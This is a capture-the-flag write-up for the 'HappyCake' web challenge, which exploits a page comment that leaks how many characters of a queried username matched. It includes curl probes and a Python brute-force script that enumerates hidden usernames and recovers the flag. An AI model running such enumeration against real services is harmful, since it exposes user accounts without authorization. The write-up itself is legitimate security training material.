# HappyCake
Web, 15 points

## Description
> Wish'em happy birthday!

A link to a website was provided.

## Solution

We visit the website and see a simple page with several birthday wishes, e.g.:

```html
<div birthday="">
    <p subtitle="">Happy cake, Nir!</p>
    <div info="" row="">
        <p content="">06/12/2019</p>
        <a tag="" content="" href="scripts/page/?Nadav">@Nadav</a>
    </div>
    <p content="">Happy cake, <a tag="" content="" href="scripts/page/?Nir">@Nir</a>.</p>
    <p>We wish you the best of everything, including dogs and flags.</p>
</div>
```

Clicking one of the '`@Name`' links brings us to the a profile page, e.g.:

```html
    <!DOCTYPE html>
    <!--
     Copyright (c) 2019 Nadav Tasher
     https://github.com/NadavTasher/BaseTemplate/
    -->
    <html lang="en">
    <head>
        <meta charset="UTF-8"/>
        <meta name="description" content="Info about Nadav">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes, minimal-ui"/>
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#dae4ed"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
        <meta name="apple-mobile-web-app-title" content="Happy Cake!"/>
        <title>@Nadav</title>
        <noscript></noscript>
        <style>
            /**
             * Copyright (c) 2019 Nadav Tasher
             * https://github.com/NadavTasher/BaseTemplate/
             **/

            /* ... Irrelevant style code, removed ... */
        </style>
        <script>
            /**
             * Copyright (c) 2019 Nadav Tasher
             * https://github.com/NadavTasher/BaseTemplate/
             **/

            /* ... Irrelevant Javascript code, removed... */
        </script>
        <script>

        </script>
    </head>
    <body column>
    <p style="font-size: 6vh">Developer pages</p>
    <p>Nadav's developer page</p><p>Full Web Stack, Android RE, Java, member of KAF</p>    <a href="../../">Back home</a>
    </body>
    </html>
<!-- OK -->
```

Searching for common web vulnerabilities, nothing immediate seems to reveal itself. The source code for the base template, which is linked to from the comments, doesn't seem to provide any hint either. The only odd behavior is related to the HTML comment at the end of the page:

```console
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?Nadav | tail -n 1 && echo
<!-- OK -->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/? | tail -n 1 && echo
<!-- failed after 0 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?NoSuchName | tail -n 1 && echo
<!-- failed after 2 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?N | tail -n 1 && echo
<!-- failed after 1 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?Na | tail -n 1 && echo
<!-- failed after 2 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?Nad | tail -n 1 && echo
<!-- failed after 3 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?Nada | tail -n 1 && echo
<!-- failed after 4 rounds-->
root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s http://ctf.kaf.sh/scripts/page/?Nadav | tail -n 1 && echo
<!-- OK -->
```

The comment contains `OK` if the username exists. If it doesn't, the comment seems to hint how many characters from the input matched an existing user, before it was concluded that the user doesn't exist.

This means that using brute-force, we can enumerate all the developer pages - we just need to keep count of the previous number of failed attempts and if we see it incremented, we know we found an additional valid character. Perhaps we'll find something interesting.

We'll use the following Python script:

```python
from collections import namedtuple
from enum import Enum
import requests
import argparse
import string
import time
import re

# Printable characters (excluding {'\r', '\x0c', '\t', '\x0b', '\n'}), order optimized for CTF flags
ALPHABET = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
assert(set(ALPHABET) == set(string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation + ' '))

status_comment_regex = re.compile(r'<!-- (failed after (?P<num_failed_rounds>\d+) rounds|OK )-->')
Partial_Result = namedtuple('Partial_Result', 'username num_failed_rounds')

class SearchMode(Enum):
    GREEDY = 'greedy'
    BFS = 'bfs'
    
    def __str__(self):
        return self.value


def try_user(username: str) -> int:
    r = requests.get(f"https://ctf.kaf.sh/scripts/page/?{username}")
    last_line = r.text.split("\n")[-1]
    if (match:= status_comment_regex.match(last_line)):
        res = match.group('num_failed_rounds')
        return int(res) if res is not None else None

def main(initial_string, search_mode):
    working_queue = [Partial_Result(initial_string, try_user(initial_string))]
    users = []
    while len(working_queue) > 0:
        queue_item = working_queue.pop(0)
        for c in ALPHABET:
            new_username = queue_item.username + c
            num_failed_rounds = try_user(new_username)
            if num_failed_rounds is None:
                users.append(new_username)
                print(f'Found user: {new_username}', end=', ' if search_mode == SearchMode.BFS else '\n', flush=True)
                if search_mode == SearchMode.GREEDY:
                    break
            elif num_failed_rounds > queue_item.num_failed_rounds:
                partial_result = Partial_Result(new_username, num_failed_rounds)
                working_queue.append(partial_result)
                print (f'{new_username}', end=', ' if search_mode == SearchMode.BFS else '\r', flush=True)
                if search_mode == SearchMode.GREEDY:
                    break
                    
    if search_mode == SearchMode.BFS:
        print ("Found the following users:")
        print(users)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", '--initial_string', action='store', type=str, default="", help='Initial string value to start scanning from')
    parser.add_argument("-m", '--search_mode', action='store', type=SearchMode, choices=list(SearchMode), default=SearchMode.BFS, help='Search Mode')
    args = parser.parse_args()
    main(args.initial_string, args.search_mode)
```

By default, it uses [BFS](https://en.wikipedia.org/wiki/Breadth-first_search) to display the first `n` characters of each existing profile. If we spot an interesting prefix, we can abort the search and use `Greedy` mode to further explore it, instead of waiting for the `BFS` search to finish.

Running it, we get:
```console
root@kali:/media/sf_CTFs/kaf/HappyCake# python3.8 solve.py
E, T, A, O, I, N, S, H, R, D, L, C, U, M, W, F, G, Y, P, B, V, K, J, X, Q, Z, Et, Ea, En, Es, Er, Ed, El, Eu, Em, Ep, Ev, Ez, Te, Ta, To, Ti, Th, Tr, Tu, Found user: Ty, At, Aa, Ai, An, As, Ah, Ar, Ad, Al, Ac, Au, Am, Ag, Ay, Ap, Ab, Av, Ax, Az, Ot, Oa, Os, Or, Od, Ol, Om, Ow, Ia, Is, Ir, Ig, Ib, Iv, Ik, Iz, Ne, Na, No, Ni, Se, St, Sa, So, Si, Sh, Sc, Su, Sy, Sp, Sk, He, Ha, Ho, Hu, Re, Ra, Ro, Ri, Rh, Ru, Ry, De, Da, Do, Di, Dr, Du, Dw, Dy, Le, La, Lo, Li, Lu, Ly, Ce, Ca, Co, Ch, Cr, Cl, Cu, Cy, Ur, Ul, Me, Ma, Mo, Mi, Mu, My, We, Wa, Wi, Wy, Fe, Fa, Fo, Fi, Fr, Fl, Ge, Ga, Go, Gi, Gr, Gu, Ye, Ya, Yo, Yi, Yu, Pe, Pa, Po, Pi, Ph, Pr, Be, Ba, Found user: Bo, Bi, Br, Bl, By, Bj, Va, Vi, Ke, KA, Ka, Ko, Ki, Kn, Kh, Kr, Ky, Je, Ja, Jo, Ji, Ju, Xa, Xz, Qu, Ze, Za, Zi, Zy, Eth [...]
```

Scanning through the intermediate results, we can spot an interesting prefix: `KA`, which is:
1. The only prefix that has two capital letters
2. The beginning of the flag format: `KAF{}`

Now's the time to switch to greedy mode:
```console
root@kali:/media/sf_CTFs/kaf/HappyCake# python3.8 solve.py -s KA -m greedy
Found user: KAF{12098421009713091723097120397428479354_ju5t_m3551n9_w1th_ya_b0ii}

root@kali:/media/sf_CTFs/kaf/HappyCake# curl -s "http://ctf.kaf.sh/scripts/page/?KAF\{1209842100971309172309712039742847
9354_ju5t_m3551n9_w1th_ya_b0ii\}" | tail -n 6 && echo
    <body column>
    <p style="font-size: 6vh">Developer pages</p>
    <p>KAF{12098421009713091723097120397428479354_ju5t_m3551n9_w1th_ya_b0ii}'s developer page</p><p>Full flag developer, Scriptlicker</p>    <a href="../../">Back home</a>
    </body>
    </html>
<!-- OK -->
```

